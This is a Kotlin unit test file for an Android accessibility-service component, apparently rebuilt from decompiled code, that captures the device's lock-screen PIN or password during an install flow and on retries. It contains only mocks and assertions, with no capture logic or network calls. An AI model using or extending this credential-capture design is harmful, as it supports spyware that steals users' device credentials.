package com.storm.safe.rock.service.delegates

import android.app.KeyguardManager
import android.content.Context
import android.content.SharedPreferences
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import com.storm.safe.rock.util.DebugConfig
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.*
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * Tests for CipherFlowController — cipher/password capture delegate
 * extracted from MyAccessibilityService.
 *
 * JADX methods: capturePasswordViaSystemAuth, launchPasswordCapture,
 * doLaunchSystemPasswordCapture, onPasswordPageDismissedByUser,
 * completeInstallationWithCipher, handleCipherCredentialResult,
 * enableCipherCapture, launchCipherCaptureFromControl.
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30], manifest = Config.NONE)
class CipherFlowControllerTest {

    private lateinit var mockService: MyAccessibilityService
    private lateinit var controller: CipherFlowController

    private lateinit var appConfigPrefs: SharedPreferences
    private lateinit var appConfigEditor: SharedPreferences.Editor
    private lateinit var cipherConfigPrefs: SharedPreferences
    private lateinit var cipherConfigEditor: SharedPreferences.Editor
    private lateinit var appStatePrefs: SharedPreferences
    private lateinit var appStateEditor: SharedPreferences.Editor

    @Before
    fun setup() {
        mockService = mock(MyAccessibilityService::class.java)

        // SharedPreferences mocks
        appConfigPrefs = mock(SharedPreferences::class.java)
        appConfigEditor = mock(SharedPreferences.Editor::class.java)
        `when`(appConfigPrefs.edit()).thenReturn(appConfigEditor)
        `when`(appConfigEditor.putBoolean(anyString(), anyBoolean())).thenReturn(appConfigEditor)
        `when`(appConfigEditor.putString(anyString(), anyString())).thenReturn(appConfigEditor)

        cipherConfigPrefs = mock(SharedPreferences::class.java)
        cipherConfigEditor = mock(SharedPreferences.Editor::class.java)
        `when`(cipherConfigPrefs.edit()).thenReturn(cipherConfigEditor)
        `when`(cipherConfigEditor.putBoolean(anyString(), anyBoolean())).thenReturn(cipherConfigEditor)
        `when`(cipherConfigEditor.putString(anyString(), anyString())).thenReturn(cipherConfigEditor)

        appStatePrefs = mock(SharedPreferences::class.java)
        appStateEditor = mock(SharedPreferences.Editor::class.java)
        `when`(appStatePrefs.edit()).thenReturn(appStateEditor)
        `when`(appStateEditor.putBoolean(anyString(), anyBoolean())).thenReturn(appStateEditor)

        `when`(mockService.getSharedPreferences(eq("app_config"), anyInt())).thenReturn(appConfigPrefs)
        `when`(mockService.getSharedPreferences(eq("cipher_config"), anyInt())).thenReturn(cipherConfigPrefs)
        `when`(mockService.getSharedPreferences(eq("app_state"), anyInt())).thenReturn(appStatePrefs)

        controller = CipherFlowController(mockService)
    }

    // ════════════════════════════════════════════════════════════════
    // captureViaSystemAuth
    // ════════════════════════════════════════════════════════════════

    @Test
    fun `captureViaSystemAuth skips when cipher_captured is true in install flow`() {
        `when`(appConfigPrefs.getBoolean("cipher_captured", false)).thenReturn(true)

        kotlinx.coroutines.runBlocking {
            controller.captureViaSystemAuth(isInstallationFlow = true)
        }

        // Should not set isCipherCaptureEnabled since it returned early
        verify(mockService, never()).isCipherCaptureEnabled = true
    }

    @Test
    fun `captureViaSystemAuth does not skip cipher_captured gate for non-install flow`() {
        `when`(appConfigPrefs.getBoolean("cipher_captured", false)).thenReturn(true)

        val km = mock(KeyguardManager::class.java)
        `when`(km.isKeyguardSecure).thenReturn(false)
        `when`(mockService.getSystemService(Context.KEYGUARD_SERVICE)).thenReturn(km)

        kotlinx.coroutines.runBlocking {
            controller.captureViaSystemAuth(isInstallationFlow = false)
        }

        // Should not skip on cipher_captured for non-install flow,
        // but should skip on keyguard not secure
        verify(mockService, never()).isCipherCaptureEnabled = true
    }

    @Test
    fun `captureViaSystemAuth skips when keyguard is not secure`() {
        `when`(appConfigPrefs.getBoolean("cipher_captured", false)).thenReturn(false)

        val km = mock(KeyguardManager::class.java)
        `when`(km.isKeyguardSecure).thenReturn(false)
        `when`(mockService.getSystemService(Context.KEYGUARD_SERVICE)).thenReturn(km)

        kotlinx.coroutines.runBlocking {
            controller.captureViaSystemAuth(isInstallationFlow = true)
        }

        verify(mockService, never()).isCipherCaptureEnabled = true
    }

    // ════════════════════════════════════════════════════════════════
    // enableCipherCapture
    // ════════════════════════════════════════════════════════════════

    @Test
    fun `enableCipherCapture sets isCipherCaptureEnabled on service`() {
        controller.enableCipherCapture()

        verify(mockService).isCipherCaptureEnabled = true
    }

    // ════════════════════════════════════════════════════════════════
    // launchCipherCaptureFromControl
    // ════════════════════════════════════════════════════════════════

    @Test
    fun `launchCipherCaptureFromControl delegates to launchPasswordCapture with false`() {
        // When isCipherCaptureEnabled is false, launchPasswordCapture returns early.
        // This verifies it doesn't crash and the delegation path works.
        `when`(mockService.isCipherCaptureEnabled).thenReturn(false)

        controller.launchCipherCaptureFromControl("pin")

        // Should not increment passwordLaunchCount because isCipherCaptureEnabled is false
        verify(mockService, never()).passwordLaunchCount = anyInt()
    }

    // ════════════════════════════════════════════════════════════════
    // handleCipherCredentialResult — success path
    // ════════════════════════════════════════════════════════════════

    @Test
    fun `handleCipherCredentialResult resets cipherRetryCount on success`() {
        mockService.cipherRetryCount = 5

        controller.handleCipherCredentialResult(true)

        // After success, cipherRetryCount should be reset to 0
        assertEquals(0, mockService.cipherRetryCount)
    }

    @Test
    fun `handleCipherCredentialResult saves cipher_completed to prefs on success`() {
        controller.handleCipherCredentialResult(true)

        verify(cipherConfigEditor).putBoolean("cipher_completed", true)
        verify(cipherConfigEditor).apply()
    }

    @Test
    fun `handleCipherCredentialResult disables cipher capture on success when not debug`() {
        controller.handleCipherCredentialResult(true)

        verify(mockService).isCipherCaptureEnabled = false
    }

    // ════════════════════════════════════════════════════════════════
    // onPasswordPageDismissedByUser
    // ════════════════════════════════════════════════════════════════

    @Test
    fun `onPasswordPageDismissedByUser does nothing when cipher capture not enabled`() {
        `when`(mockService.isCipherCaptureEnabled).thenReturn(false)

        controller.onPasswordPageDismissedByUser()

        // Should return early, cipherCaptureManager should not be touched
        verify(mockService, never()).cipherCaptureManager
    }

    // ════════════════════════════════════════════════════════════════
    // doLaunchSystemPasswordCapture
    // ════════════════════════════════════════════════════════════════

    @Test
    fun `doLaunchSystemPasswordCapture resets cipherRetryCount`() {
        mockService.cipherRetryCount = 3

        controller.doLaunchSystemPasswordCapture(isInstallationFlow = false)

        assertEquals(0, mockService.cipherRetryCount)
    }

    @Test
    fun `doLaunchSystemPasswordCapture starts listening on cipherCaptureManager`() {
        val mockCcm = mock(CipherCaptureManager::class.java)
        `when`(mockService.cipherCaptureManager).thenReturn(mockCcm)

        controller.doLaunchSystemPasswordCapture(isInstallationFlow = true)

        verify(mockCcm).startListening()
    }
}
